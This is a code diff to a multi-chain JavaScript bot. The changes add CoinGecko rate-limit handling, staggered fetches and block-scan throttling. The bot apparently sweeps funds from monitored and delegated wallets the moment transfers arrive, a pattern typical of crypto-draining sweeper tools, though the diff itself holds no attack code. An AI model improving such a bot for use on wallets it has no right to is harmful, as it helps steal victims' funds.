@@ -37,6 +37,11 @@ const CHAIN                     = process.env.CHAIN || "bnb";
 const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const MIN_ETH_WEI          = ethers.parseEther("0.001");
 const MIN_TOKEN_UNITS      = "0.5";
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+// Stagger CoinGecko startup fetch to avoid hitting rate limits when all bots start
+const CG_STAGGER_MS = { eth: 0, bnb: 10_000, polygon: 20_000 };
 const TOKEN_CALL_DELAY     = 150;     // ms after each token call
 // Minimum relayer balance — if below this, skip ALL sweeps to avoid failed txs
 const RELAYER_MIN_WEI      = ethers.parseEther("0.01"); // 0.01 BNB
@@ -940,6 +945,20 @@ async function sweepGaslessWallet(walletAddress) {
 
 // ── CoinGecko token list ──────────────────────────────────────────────────────
 
+async function cgFetchWithRetry(url) {
+  for (let attempt = 0; attempt < 2; attempt++) {
+    const res = await fetch(url);
+    if (res.status === 429) {
+      log("[tokens] rate limited (429) — waiting 60s before retry");
+      await sleep(60_000);
+      continue;
+    }
+    if (!res.ok) throw new Error(`CoinGecko ${res.status} for ${url}`);
+    return res.json();
+  }
+  throw new Error(`CoinGecko still rate-limited after retry`);
+}
+
 async function fetchTokenList(chain) {
   const platformMap = { eth: "ethereum", bnb: "binance-smart-chain", polygon: "polygon-pos" };
   const categoryMap = { eth: "ethereum-ecosystem", bnb: "bnb-chain", polygon: "polygon-ecosystem" };
@@ -947,17 +966,23 @@ async function fetchTokenList(chain) {
   const category    = categoryMap[chain] ?? categoryMap[CHAIN];
 
   try {
-    log(`[tokens] fetching top 500 tokens for ${chain} from CoinGecko...`);
-    const [page1, page2] = await Promise.all([
-      fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=1`).then(r => r.json()),
-      fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=2`).then(r => r.json()),
-    ]);
+    log(`[tokens] fetching page 1 for ${chain}...`);
+    const page1 = await cgFetchWithRetry(
+      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=1`
+    );
+    await sleep(2_000);
+
+    log(`[tokens] fetching page 2 for ${chain}...`);
+    const page2 = await cgFetchWithRetry(
+      `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=2`
+    );
+    await sleep(2_000);
+
     const allCoins = [...(Array.isArray(page1) ? page1 : []), ...(Array.isArray(page2) ? page2 : [])];
     if (!allCoins.length) throw new Error("empty markets response");
 
     log(`[tokens] fetching coin list with platform addresses...`);
-    const listRes  = await fetch("https://api.coingecko.com/api/v3/coins/list?include_platform=true");
-    const fullList = await listRes.json();
+    const fullList = await cgFetchWithRetry("https://api.coingecko.com/api/v3/coins/list?include_platform=true");
 
     const addressMap = {};
     for (const coin of (Array.isArray(fullList) ? fullList : [])) {
@@ -1002,6 +1027,13 @@ async function loadTokens() {
       return cached.tokens;
     }
   } catch { /* no cache — fetch fresh */ }
+
+  // Stagger API calls to avoid all 3 bots hitting CoinGecko simultaneously
+  const stagger = CG_STAGGER_MS[CHAIN] ?? 0;
+  if (stagger > 0) {
+    log(`[tokens] staggering fetch by ${stagger / 1000}s (chain=${CHAIN})...`);
+    await sleep(stagger);
+  }
 
   const tokens = await fetchTokenList(CHAIN);
   try {
@@ -1114,10 +1146,18 @@ async function startTransferListeners(wsProvider, tokens) {
   log(`[listeners] ✅ all ${tokens.length} Transfer listeners active`);
 }
 
+let lastBlockFetch = 0;
+
 async function startNativeListener(wsProvider) {
   wsProvider.on("block", async (blockNumber) => {
     reconnectAttempt = 0; // reset backoff on each received block
     if (monitoredWallets.size === 0) return;
+
+    // Throttle: max 1 full-block fetch per 3 seconds to avoid RPC rate limits
+    const now = Date.now();
+    if (now - lastBlockFetch < 3_000) return;
+    lastBlockFetch = now;
+
     try {
       const block = await rpcProvider.getBlock(blockNumber, true);
       if (!block?.transactions) return;
@@ -1146,7 +1186,9 @@ async function startNativeListener(wsProvider) {
           .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
       }
     } catch (e) {
-      if (!e.message?.includes("timeout")) {
+      if (e.message?.includes("rate limit") || e.message?.includes("50/second") || e.message?.includes("429")) {
+        log(`[native] rate limited — skipping block ${blockNumber}`);
+      } else if (!e.message?.includes("timeout")) {
         warn(`[native] block scan error at ${blockNumber}: ${e.message}`);
       }
     }
@@ -1299,9 +1341,13 @@ async function init() {
   TOKENS = await loadTokens();
   log(`[init] ${TOKENS.length} tokens loaded`);
 
-  // 2. Check relayer balance upfront
+  // 2. Check relayer balance upfront — warn but always continue
   const relayerOk = await checkRelayerBalance();
-  if (!relayerOk) log("[init] ⚠️  relayer low — sweeps will skip until topped up");
+  if (!relayerOk) {
+    log(`[init] ⚠️  RELAYER CRITICALLY LOW — bot will start but sweeps are DISABLED`);
+    log(`[init] Top up relayer: send ${CHAIN.toUpperCase()} to ${relayerWallet.address}`);
+    log(`[init] Required minimum: ${ethers.formatEther(RELAYER_MIN_WEI)} ${CHAIN.toUpperCase()}`);
+  }
 
   // 3. Load wallets from Supabase (populates monitoredWallets + delegatedWallets)
   await loadDelegatedWallets();
